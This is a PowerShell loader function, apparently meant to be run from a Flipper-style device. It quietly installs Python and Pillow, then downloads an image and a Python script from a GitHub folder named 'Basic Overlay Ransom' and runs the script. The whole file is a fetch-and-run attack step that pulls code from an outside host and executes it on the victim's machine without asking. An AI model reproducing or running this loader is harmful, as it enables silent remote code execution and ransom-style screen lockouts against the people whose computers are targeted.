function Start-Overlay {
    # Function to download a file using WebClient
    function Download-File {
        param (
            [string]$url,
            [string]$outputPath
        )

        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $outputPath)
    }

    # Download Python installer
    $pythonInstallerUrl = "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"
    $pythonInstallerPath = "$env:TEMP\python_installer.exe"
    Download-File -url $pythonInstallerUrl -outputPath $pythonInstallerPath

    # Install Python
    Start-Process -Wait -FilePath $pythonInstallerPath -ArgumentList "/quiet", "PrependPath=1"

    # Install pip
    python -m ensurepip

    # Install Pillow
    pip install Pillow

    # Cleanup
    Remove-Item -Path $pythonInstallerPath

    # Define the URL of the PNG file and the destination path
    $sourceUrl = "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/datsmean.png"
    $destinationPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "datsmean.png")

    # Create a WebClient object to download the file
    $webClient = New-Object System.Net.WebClient

    try {
        # Download the file
        $webClient.DownloadFile($sourceUrl, $destinationPath)
    } catch {
        Write-Host "Error downloading the file: $_.Exception.Message"
    } finally {
        # Dispose of the WebClient object
        $webClient.Dispose()
    }

    # Set the URL of the Python script to download
    $pythonScriptUrl = "https://raw.githubusercontent.com/calinux-py/Python/main/Basic%20Overlay%20Ransom/FlipperVersion.py"

    # Set the destination path to save the downloaded Python script
    $destinationPath = "$env:TEMP\FlipperVersion.py"

    try {
        # Download the Python script using Invoke-WebRequest
        Write-Host "Downloading the Python script..."
        Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $destinationPath -ErrorAction Stop

        # Run the downloaded Python script
        Write-Host "Running the downloaded Python script..."
        python.exe $destinationPath
    } catch {
        Write-Host "An error occurred: $_.Exception.Message"
    }
}

